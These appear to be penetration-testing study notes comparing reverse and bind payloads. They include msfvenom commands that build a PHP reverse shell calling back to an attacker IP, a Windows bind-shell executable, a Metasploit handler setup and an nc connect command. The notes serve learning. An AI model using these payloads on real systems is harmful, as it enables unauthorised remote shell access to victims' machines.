## 🔹 Reverse Payload

- **What happens?** The victim connects back to your machine.
- **Workflow:**
    1. You generate the payload with `msfvenom` and embed your attacker IP (`LHOST`) and port (`LPORT`).
    2. You start a **handler** in Metasploit (`exploit/multi/handler`) or a listener with Netcat.
    3. The victim executes the payload → it calls back to your IP:PORT.
    4. The handler catches the connection → you get a shell or Meterpreter session.
- **Example:**
    
    ```bash
    msfvenom -p php/reverse_php LHOST=10.0.2.19 LPORT=7777 -f raw > reverse_shell.php
    ```
    
    Then in Metasploit:
    
    ```bash
    use exploit/multi/handler
    set PAYLOAD php/reverse_php
    set LHOST 10.0.2.19
    set LPORT 7777
    run
    ```
    

---

## 🔹 Bind Payload

- **What happens?** The victim opens a port and waits for you to connect.
- **Workflow:**
    1. You generate the payload with `msfvenom` and specify the port (`RPORT`) the victim will bind.
    2. The victim executes the payload → it starts listening on that port.
    3. You connect directly to the victim’s IP and port using Netcat or Metasploit.
    4. Once connected, you get a shell.
- **Example:**
    
    ```bash
    msfvenom -p windows/shell_bind_tcp RPORT=4444 -f exe > bind_shell.exe
    ```
    
    Victim runs it, then you connect:
    
    ```bash
    nc <RHOST> 4444
    ```
    

---

## ⚡ Quick Comparison

|Type|Who Listens?|Who Connects?|Handler Required?|
|---|---|---|---|
|**Reverse**|Attacker|Victim → Attacker|✅ Yes|
|**Bind**|Victim|Attacker → Victim|❌ No (Netcat works)|

---

👉 In short:

- **Reverse payloads** → handler is mandatory.
- **Bind payloads** → handler is optional, you can connect directly.